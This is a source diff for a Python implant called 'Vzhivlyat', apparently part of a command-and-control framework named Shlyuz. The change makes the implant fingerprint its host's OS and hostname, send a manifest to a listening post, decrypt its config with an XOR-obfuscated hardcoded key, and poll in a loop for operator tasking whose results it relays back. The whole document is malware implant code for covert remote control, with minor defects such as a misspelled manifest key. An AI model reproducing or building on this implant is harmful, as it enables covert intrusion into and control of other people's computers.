@@ -3,9 +3,12 @@
 import ast
 import pickle
 import configparser
+import platform
+from time import sleep
 
 from lib import logging
 from lib import yadro
+from lib import frame_orchestrator
 
 from lib.crypto import asymmetric
 from lib.crypto import rc6
@@ -17,12 +20,13 @@ class Vzhivlyat(object):
     def __init__(self):
         super(Vzhivlyat, self).__init__()
         self.logging = logging.Logging(True)  # DEBUG
-        self.component_id = "c41b07a940254f1d87ba60aadb93dded"  # DEBUG
         self.config_file_path = "shlyuz.conf"
         # TODO: Check if this needs to be cleared in memory
-        self.config_key = xor.single_byte_xor(b'0\x02X(\x01\x1c\x1b\x1c/Q\x1a ]%1Q', 0x69).decode('utf-8')
+        self.config_key = xor.single_byte_xor(b'\x1f\x04=\x0eP\x058\x05\x198&*\x13(+\n', 0x69).decode('utf-8')
         self.config = configparser.RawConfigParser()
         self.config.read_string(self.decrypt_config())
+        self.component_id = self.config['vzhivlyat']['id']
+        self.check_time = int(self.config['vzhivlyat']['task_check_time'])
 
         # Crypto values
         self.initial_private_key = asymmetric.private_key_from_bytes(self.config['crypto']['priv_key'])
@@ -51,12 +55,26 @@ class Vzhivlyat(object):
         del decrypted_contents
         return decrypted_config
 
+    def prepare_manifest(self):
+        uname = platform.uname()
+        self.manifest = {"implant_id": self.component_id, "implant_os": f"{uname.system}", "impant_hostname": f"{uname.node}"}
+        init_frame = yadro.connect_to_lp(self)
+        yadro.relay_init_frame(self, init_frame)
+
 
 vzhivlyat = Vzhivlyat()
-transport_config = {"bind_addr": "127.0.0.1", "bind_port": 8084}
+transport_config = {"transport_id": vzhivlyat.component_id, "connect_addr": "127.0.0.1", "connect_port": 8084}
 vzhivlyat.transport = yadro.import_transport_for_implant(vzhivlyat, transport_config)
+vzhivlyat.prepare_manifest()
 
-# TODO: I need to happen after an initialization
 while True:
-    data = yadro.retrieve_output(vzhivlyat)
-    yadro.relay_reply(vzhivlyat, data)
+    transport_frame = vzhivlyat.transport.recv_data()
+    if transport_frame is None:
+        pass
+    else:
+        data = frame_orchestrator.process_transport_frame(vzhivlyat, transport_frame)
+        if data is not 0:
+            yadro.relay_reply(vzhivlyat, data)
+        else:
+            vzhivlyat.logging.log(f"Waiting for {vzhivlyat.check_time}", level="debug")
+    sleep(int(vzhivlyat.check_time))
